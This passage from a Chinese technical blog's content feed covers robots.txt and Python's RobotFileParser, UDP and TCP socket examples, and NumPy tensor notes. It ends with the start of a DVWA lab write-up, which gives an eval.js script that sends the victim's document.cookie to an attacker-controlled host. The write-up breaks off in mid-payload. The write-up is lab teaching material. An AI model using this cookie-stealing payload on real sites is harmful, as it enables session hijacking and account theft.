Protocol），用来告诉爬虫和搜索引擎哪些页面可以抓取，哪些不可以抓取。它通常是一个叫作robots.txt的文本文件，一般放在网站的根目录下。</p></li><li><p>当搜索爬虫访问一个站点时，它首先会检查这个站点根目录下是否存在robots.txt文件，如果存在，搜索爬虫会根据其中定义的爬取范围来爬取。如果没有找到这个文件，搜索爬虫便会访问所有可直接访问的页面。</p></li></ul><p>下面的例子实现了对所有搜索爬虫只允许爬取public目录的功能，将上述内容保存成robots.txt文件，放在网站的根目录下，和网站的入口文件（比如index.php、index.html和index.jsp等）放在一起。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;</span><br><span class="line">Allow: &#x2F;public&#x2F;</span><br></pre></td></tr></table></figure><p>上面的User-agent描述了搜索爬虫的名称，这里将其设置为*则代表该协议对任何爬取爬虫有效。比如，我们可以设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br></pre></td></tr></table></figure><p>这就代表我们设置的规则对百度爬虫是有效的。如果有多条User-agent记录，则就会有多个爬虫会受到爬取限制，但至少需要指定一条。</p><ul><li>下面是几个例子：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#禁止所有爬虫访问任何目录的代码如下：</span><br><span class="line">User-agent: * </span><br><span class="line">Disallow: &#x2F;</span><br><span class="line"></span><br><span class="line">#允许所有爬虫访问任何目录的代码如下：</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line"></span><br><span class="line">#直接把robots.txt文件留空也是可以的。</span><br><span class="line"></span><br><span class="line">#禁止所有爬虫访问网站某些目录的代码如下：</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;private&#x2F;</span><br><span class="line">Disallow: &#x2F;tmp&#x2F;</span><br><span class="line"></span><br><span class="line">#只允许某一个爬虫访问的代码如下：</span><br><span class="line">User-agent: WebCrawler</span><br><span class="line">Disallow:</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;</span><br></pre></td></tr></table></figure><h2 id="41-常见搜索爬虫的名称及其对应的网站"><a class="markdownIt-Anchor" href="#41-常见搜索爬虫的名称及其对应的网站"></a> 4.1 常见搜索爬虫的名称及其对应的网站</h2><p><img src="https://img-blog.csdnimg.cn/20191019202610869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><h2 id="42-robotparser"><a class="markdownIt-Anchor" href="#42-robotparser"></a> 4.2 robotparser</h2><ul><li>可以使用robotparser模块来解析robots.txt。该模块提供了一个类<kbd>RobotFileParser</kbd>，它可以根据某网站的robots.txt文件来判断一个爬取爬虫是否有权限来爬取这个网页。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urllib.robotparser.RobotFileParser(url=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>下面列出了这个类常用的几个方法。</p><ul><li><kbd>set_url()</kbd>：用来设置robots.txt文件的链接。如果在创建RobotFileParser对象时传入了链接，那么就不需要再使用这个方法设置了。</li><li><kbd>read()</kbd>：读取robots.txt文件并进行分析。注意，这个方法执行一个读取和分析操作，如果不调用这个方法，接下来的判断都会为False，所以一定记得调用这个方法。这个方法不会返回任何内容，但是执行了读取操作。</li><li><kbd>parse()</kbd>：用来解析robots.txt文件，传入的参数是robots.txt某些行的内容，它会按照robots.txt的语法规则来分析这些内容。</li><li><kbd>can_fetch()</kbd>：该方法传入两个参数，第一个是User-agent，第二个是要抓取的URL。返回的内容是该搜索引擎是否可以抓取这个URL，返回结果是True或False。</li><li><kbd>mtime()</kbd>：返回的是上次抓取和分析robots.txt的时间，这对于长时间分析和抓取的搜索爬虫是很有必要的，你可能需要定期检查来抓取最新的robots.txt。</li><li><kbd>modified()</kbd>：它同样对长时间分析和抓取的搜索爬虫很有帮助，将当前时间设置为上次抓取和分析robots.txt的时间。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.robotparser <span class="keyword">import</span> RobotFileParser</span><br><span class="line"> </span><br><span class="line">rp = RobotFileParser()</span><br><span class="line">rp.set_url(<span class="string">'http://www.jianshu.com/robots.txt'</span>)</span><br><span class="line">rp.read()</span><br><span class="line">print(rp.can_fetch(<span class="string">'*'</span>, <span class="string">'http://www.jianshu.com/p/b67554025d7d'</span>))</span><br><span class="line">print(rp.can_fetch(<span class="string">'*'</span>, <span class="string">"http://www.jianshu.com/search?q=python&amp;page=1&amp;type=collections"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以在声明RobotFileParser时直接set_url：</span></span><br><span class="line">rp = RobotFileParser(<span class="string">'http://www.jianshu.com/robots.txt'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络编程-UDP</title>
      <link href="/2020/02/21/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-UDP/"/>
      <url>/2020/02/21/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-UDP/</url>
      
        <content type="html"><![CDATA[<h1 id="1-服务器"><a class="markdownIt-Anchor" href="#1-服务器"></a> 1 服务器</h1><h2 id="21-绑定端口"><a class="markdownIt-Anchor" href="#21-绑定端口"></a> 2.1 绑定端口</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># 绑定端口:</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br></pre></td></tr></table></figure><ul><li><kbd>SOCK_DGRAM</kbd>：指定了这个Socket的类型是UDP。</li><li>绑定端口和TCP一样，但是不需要调用listen()方法，而是直接接收来自任何客户端的数据：</li></ul><h2 id="22-接受数据"><a class="markdownIt-Anchor" href="#22-接受数据"></a> 2.2 接受数据</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">'Bind UDP on 9999...'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 接收数据:</span></span><br><span class="line">    data, addr = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'Received from %s:%s.'</span> % addr)</span><br><span class="line">    s.sendto(<span class="string">b'Hello, %s!'</span> % data, addr)</span><br></pre></td></tr></table></figure><p><kbd>recvfrom</kbd>：返回数据和客户端的地址与端口，这样，服务器收到数据后，直接调用<kbd>sendto()</kbd>就可以把数据用UDP发给客户端。</p><p>注意：这里省略了多线程。</p><h1 id="2-客户端"><a class="markdownIt-Anchor" href="#2-客户端"></a> 2 客户端</h1><ul><li>客户端使用UDP时，首先仍然创建基于UDP的Socket，然后，不需要调用connect()，直接通过sendto()给服务器发数据：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.sendto(data, (<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br><span class="line">    <span class="comment"># 接收数据:</span></span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><ul><li>接收服务器发来的数据仍然调用recv()方法。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络编程-TCP</title>
      <link href="/2020/02/21/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-TCP/"/>
      <url>/2020/02/21/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-TCP/</url>
      
        <content type="html"><![CDATA[<h1 id="1-客户端"><a class="markdownIt-Anchor" href="#1-客户端"></a> 1 客户端</h1><ul><li><kbd>Socket</kbd>：表示打开了一个网络链接，需要知道目标计算机的<strong>IP地址、端口号和协议类型</strong>。</li></ul><h2 id="11创建一个socket连接"><a class="markdownIt-Anchor" href="#11创建一个socket连接"></a> 1.1创建一个Socket连接：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入socket库:</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个socket:</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure><ul><li><kbd>AF_INET</kbd>：指定使用IPv4协议，如果要用更先进的IPv6，就指定为<kbd>AF_INET6</kbd></li><li><kbd>SOCK_STREAM</kbd>：指定使用面向流的TCP协议</li></ul><h2 id="12-连接服务器"><a class="markdownIt-Anchor" href="#12-连接服务器"></a> 1.2 连接服务器：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.connect((<span class="string">'www.sina.com.cn'</span>, <span class="number">80</span>))</span><br></pre></td></tr></table></figure><ul><li>注意参数是一个tuple，包含地址和端口号。</li></ul><h2 id="13-发送数据"><a class="markdownIt-Anchor" href="#13-发送数据"></a> 1.3 发送数据</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 发送数据:</span></span><br><span class="line">s.send(<span class="string">b'GET / HTTP/1.1\r\nHost: www.sina.com.cn\r\nConnection: close\r\n\r\n'</span>)</span><br></pre></td></tr></table></figure><h2 id="14-接受数据"><a class="markdownIt-Anchor" href="#14-接受数据"></a> 1.4 接受数据</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收数据:</span></span><br><span class="line">buffer = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 每次最多接收1k字节:</span></span><br><span class="line">    d = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data = <span class="string">b''</span>.join(buffer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接:</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p><kbd>recv(max)</kbd>：一次最多接收指定的字节数<br /><kbd>close()</kbd>：关闭Socket</p><p>接收到的数据包括HTTP头和网页本身，我们只需要把HTTP头和网页分离一下，把HTTP头打印出来，网页内容保存到文件：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">header, html = data.split(<span class="string">b'\r\n\r\n'</span>, <span class="number">1</span>)</span><br><span class="line">print(header.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment"># 把接收的数据写入文件:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'sina.html'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure><h1 id="2-服务器"><a class="markdownIt-Anchor" href="#2-服务器"></a> 2 服务器</h1><ul><li>服务器进程首先要绑定一个端口并监听来自其他客户端的连接。如果某个客户端连接过来了，服务器就与该客户端建立Socket连接，随后的通信就靠这个Socket连接了。</li><li>一个Socket依赖4项：服务器地址、服务器端口、客户端地址、客户端端口来唯一确定一个Socket。</li><li>每个连接都需要一个新的进程或者新的线程来处理，以使服务器可以同时响应多个客户端的请求。</li></ul><h2 id="21-创建socket"><a class="markdownIt-Anchor" href="#21-创建socket"></a> 2.1 创建Socket</h2><p>创建一个基于IPv4和TCP协议的Socket：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure><h2 id="22-绑定监听ip和端口"><a class="markdownIt-Anchor" href="#22-绑定监听ip和端口"></a> 2.2 绑定监听IP和端口</h2><p>然后，我们要绑定监听的地址和端口。服务器可能有多块网卡，可以绑定到某一块网卡的IP地址上，也可以用0.0.0.0绑定到所有的网络地址，还可以用127.0.0.1绑定到本机地址。127.0.0.1是一个特殊的IP地址，表示本机地址，如果绑定到这个地址，客户端必须同时在本机运行才能连接，也就是说，外部的计算机无法连接进来。</p><p>端口号需要预先指定。因为我们写的这个服务不是标准服务，所以用9999这个端口号。请注意，小于1024的端口号必须要有管理员权限才能绑定：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 监听端口:</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br></pre></td></tr></table></figure><h2 id="23-监听"><a class="markdownIt-Anchor" href="#23-监听"></a> 2.3 监听</h2><p>接下来，服务器程序通过一个永久循环来接受来自客户端的连接，accept()会等待并返回一个客户端的连接:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#5表示等待连接的最大数量</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">print(<span class="string">'Waiting for connection...'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 接受一个新连接:</span></span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    <span class="comment"># 创建新线程来处理TCP连接:</span></span><br><span class="line">    t = threading.Thread(target=tcplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><h2 id="24-创建新线程"><a class="markdownIt-Anchor" href="#24-创建新线程"></a> 2.4 创建新线程</h2><ul><li>每个连接都必须创建新线程（或进程）来处理，否则，单线程在处理连接的过程中，无法接受其他客户端的连接：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connection from %s:%s...'</span> % addr)</span><br><span class="line">    sock.send(<span class="string">b'Welcome!'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>) == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello, %s!'</span> % data.decode(<span class="string">'utf-8'</span>)).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    sock.close()</span><br><span class="line">    print(<span class="string">'Connection from %s:%s closed.'</span> % addr)</span><br></pre></td></tr></table></figure><h2 id="25-测试服务器"><a class="markdownIt-Anchor" href="#25-测试服务器"></a> 2.5 测试服务器</h2><ul><li>要测试这个服务器程序，我们还需要编写一个客户端程序：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 建立连接:</span></span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br><span class="line"><span class="comment"># 接收欢迎消息:</span></span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    <span class="comment"># 发送数据:</span></span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神经网络的数据表示-张量Tensor</title>
      <link href="/2020/02/21/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA-%E5%BC%A0%E9%87%8FTensor/"/>
      <url>/2020/02/21/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA-%E5%BC%A0%E9%87%8FTensor/</url>
      
        <content type="html"><![CDATA[<p>本文是《Python深度学习》一书的相关笔记。</p><p><kbd>张量（tensor）</kbd>是一个数据容器，它所包含的一般是数值数据。下面是张量中的一些名词：</p><ul><li>轴（axis）：张量的维度（ dimension）；张量轴的个数也称作<kbd>阶</kbd>.</li><li>形状（shaple）：这是一个整数元组，表示张量沿每个轴的维度大小（元素个数）。例如，某矩<br />阵的形状为 (3, 5)表示这个矩阵有3行5列</li><li>数据类型（dtype）：张量中所包含数据的类型</li></ul><h1 id="1-标量0d-张量"><a class="markdownIt-Anchor" href="#1-标量0d-张量"></a> 1 标量（0D 张量）</h1><ul><li>仅包含一个数字的张量叫作<kbd>标量（scalar）</kbd></li><li>可以用<kbd>ndim</kbd>属性来查看一个 Numpy 张量的轴的个数。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = np.array(<span class="number">12</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">array(<span class="number">12</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x.ndim</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="2-向量1d-张量"><a class="markdownIt-Anchor" href="#2-向量1d-张量"></a> 2 向量（1D 张量）</h1><ul><li>数字组成的数组叫作<kbd>向量（vector）</kbd></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = np.array([<span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">7</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">array([<span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">7</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x.ndim</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>这个向量有 5 个元素，所以被称为 5D 向量。不要把 5D 向量和 5D 张量弄混！ 5D 向量只<br />有一个轴，沿着轴有 5 个维度，而 5D 张量有 5 个轴（沿着每个轴可能有任意个维度）。</p><h1 id="3-矩阵2d-张量"><a class="markdownIt-Anchor" href="#3-矩阵2d-张量"></a> 3 矩阵（2D 张量）</h1><ul><li>向量组成的数组叫作<kbd>矩阵（matrix）</kbd></li><li>第一个轴上的元素叫作行（row），第二个轴上的元素叫作列（column）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = np.array([[<span class="number">5</span>, <span class="number">78</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">6</span>, <span class="number">79</span>, <span class="number">3</span>, <span class="number">35</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="number">7</span>, <span class="number">80</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">2</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x.ndim</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="4-3d-张量与更高维张量"><a class="markdownIt-Anchor" href="#4-3d-张量与更高维张量"></a> 4 3D 张量与更高维张量</h1><ul><li>将多个矩阵组合成一个新的数组，可以得到一个 3D 张量，可以将其直观地理解为数字<br />组成的立方体。</li><li>将多个 3D 张量组合成一个数组，可以创建一个 4D 张量，以此类推。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = np.array([[[<span class="number">5</span>, <span class="number">78</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">6</span>, <span class="number">79</span>, <span class="number">3</span>, <span class="number">35</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="number">7</span>, <span class="number">80</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">2</span>]],</span><br><span class="line">[[<span class="number">5</span>, <span class="number">78</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">6</span>, <span class="number">79</span>, <span class="number">3</span>, <span class="number">35</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="number">7</span>, <span class="number">80</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">2</span>]],</span><br><span class="line">[[<span class="number">5</span>, <span class="number">78</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">6</span>, <span class="number">79</span>, <span class="number">3</span>, <span class="number">35</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="number">7</span>, <span class="number">80</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">2</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x.ndim</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h1 id="5-numpy张量切片"><a class="markdownIt-Anchor" href="#5-numpy张量切片"></a> 5 Numpy张量切片</h1><ul><li>我们以Numpy <strong>3D张量</strong>上的张量切片运算为例</li><li>train_images[i] 表示沿着<strong>第一个轴</strong>的所有数字</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面这个例子选择第 10~100 个数字，并将其放在形状为 (90, 28,28) 的数组中</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_slice = train_images[<span class="number">10</span>:<span class="number">100</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(my_slice.shape)</span><br><span class="line">(<span class="number">90</span>, <span class="number">28</span>, <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#下面的写法跟上面是等价的；其中:表示选取整个轴</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_slice = train_images[<span class="number">10</span>:<span class="number">100</span>, :, :]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_slice.shape</span><br><span class="line">(<span class="number">90</span>, <span class="number">28</span>, <span class="number">28</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_slice = train_images[<span class="number">10</span>:<span class="number">100</span>, <span class="number">0</span>:<span class="number">28</span>, <span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_slice.shape</span><br><span class="line">(<span class="number">90</span>, <span class="number">28</span>, <span class="number">28</span>)</span><br></pre></td></tr></table></figure><ul><li>再以某个3D张量存储的图像为例</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#你可以在所有图像的右下角选出 14 像素× 14 像素的区域：</span></span><br><span class="line">my_slice = train_images[:, <span class="number">14</span>:, <span class="number">14</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以使用负数索引。与 Python 列表中的负数索引类似，它表示与当前轴终点的相对位置。</span></span><br><span class="line"><span class="comment">#你可以在图像中心裁剪出 14 像素× 14 像素的区域：</span></span><br><span class="line">my_slice = train_images[:, <span class="number">7</span>:<span class="number">-7</span>, <span class="number">7</span>:<span class="number">-7</span>]</span><br></pre></td></tr></table></figure><h1 id="6-常用张量表示"><a class="markdownIt-Anchor" href="#6-常用张量表示"></a> 6 常用张量表示</h1><h2 id="61-向量数据"><a class="markdownIt-Anchor" href="#61-向量数据"></a> 6.1 向量数据</h2><ul><li><p>2D 张量，形状为 (samples, features)</p></li><li><p>对于这种数据集，每个数据点都被编码为一个向量，因此一个数据批<br />量就被编码为 2D 张量（即向量组成的数组），其中第一个轴是样本轴，第二个轴是特征轴。</p></li></ul><h2 id="62-时间序列数据或序列数据"><a class="markdownIt-Anchor" href="#62-时间序列数据或序列数据"></a> 6.2 时间序列数据或序列数据</h2><ul><li><p>3D 张量，形状为 (samples, timesteps, features)</p></li><li><p>如时间序列数据或序列数据</p><p>![](<a href="https://img-blog.csdnimg.cn/20191118170944522.png#pic_center" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/20191118170944522.png#pic_center</a> =400x250)</p></li></ul><h2 id="63-图像"><a class="markdownIt-Anchor" href="#63-图像"></a> 6.3 图像</h2><ul><li><p>4D 张量，形状为 (samples, height, width, channels) 或 (samples, channels, height, width)</p></li><li><p>如图像数据，图像通常具有三个维度：高度、宽度和颜色深度。</p><p>![](<a href="https://img-blog.csdnimg.cn/2019111817121883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/2019111817121883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center</a> =400x300)</p></li></ul><h2 id="64-视频"><a class="markdownIt-Anchor" href="#64-视频"></a> 6.4  视频</h2><ul><li><p>5D 张量，形状为 (samples, frames, height, width, channels) 或 (samples, frames, channels, height, width)</p></li><li><p>如视频数据，频可以看作一系列帧，每一帧都是一张彩色图像。由于每一帧都可以保存在一个形状为 (height, width, color_depth) 的 3D 张量中，因此一系列帧可以保存在一个形状为 (frames, height, width, color_depth) 的 4D 张量中，而不同视频组成的批量则可以保存在一个 5D 张量中，其形状为(samples, frames, height, width, color_depth)。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA下利用XSS获取Cookie</title>
      <link href="/2020/02/21/DVWA%E4%B8%8B%E5%88%A9%E7%94%A8XSS%E8%8E%B7%E5%8F%96Cookie/"/>
      <url>/2020/02/21/DVWA%E4%B8%8B%E5%88%A9%E7%94%A8XSS%E8%8E%B7%E5%8F%96Cookie/</url>
      
        <content type="html"><![CDATA[<p><strong>众所周知，利用XSS攻击，可以在用户登陆存在漏洞的站点之后，获取用户的Cookie值。有了Cookie，我们便可以在不知道用户名密码的情况下，模拟用户登陆站点。</strong></p><p><strong>本文记录一次在DVWA漏洞平台的XSS(Reflected)模块下，利用XSS获取该平台登陆Cookie的实验。</strong></p><h1 id="0x00-实验准备"><a class="markdownIt-Anchor" href="#0x00-实验准备"></a> 0x00 实验准备</h1><ul><li><p><strong>实验环境：</strong><br /><kbd>DVWA：</kbd>Windows 7，存在XSS漏洞的网站；|<code>IP: 192.168.124.6</code>|<br /><kbd>主机A：</kbd>Cent OS，攻击者；|<code>IP:192.168.124.7</code>|<br /><kbd>主机B：</kbd>Windows 7，被攻击者；|<code>IP: 192.168.124.2</code>|</p></li><li><p><strong>配置DVWA：</strong></p><ul><li>在Windows7下搭建DVWA。从GitHub下载DVWA源代码，下载phpStudy模拟web运行环境。将DVWA源代码放到phpStudy路径下的www目录下，注意将DVWA源代码文件夹名改为DVWA。</li><li>打开DVWA的配置文件|<code>config.inc.php.bak</code>|，将数据库密码改为|<code>$_DVWA[ 'db_password' ] = 'root';</code>|；保存后将配置文件名改为|<code>config.inc.php</code>|</li><li>开启phpStudy，在地址栏输入|<code>http://192.168.124.6/DVWA</code>|，会自动弹出登陆界面。|<code>Username / Password：admin / password</code>|</li><li>将安全等级DVWA Security改为<KBD>low</KBD></li></ul></li></ul><h1 id="2-构建payload"><a class="markdownIt-Anchor" href="#2-构建payload"></a> 2 构建Payload</h1><ul><li>在<strong>攻击者主机A</strong>下开启httpd服务；新建<kbd>eval.js</kbd>脚本，用于向主机A发送Cookie。该脚本创建了一个img元素，img.src获取到被攻击者的Cookie后以GET的方式发送给主机A：</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src = <span class="string">"http://192.168.124.7/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure><h1 id="0x02-执行攻击"><a class="markdownIt-Anchor" href="#0x02-执行攻击"></a> 0x02 执行攻击</h1><ul><li><p>在<strong>被攻击者主机B</strong>上打开DVWA的XSS(Reflected)模块：</p><p><img src="https://img-blog.csdnimg.cn/20190906164953991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p></li><li><p>在What’s your name输入框中输入|<code>&lt;script 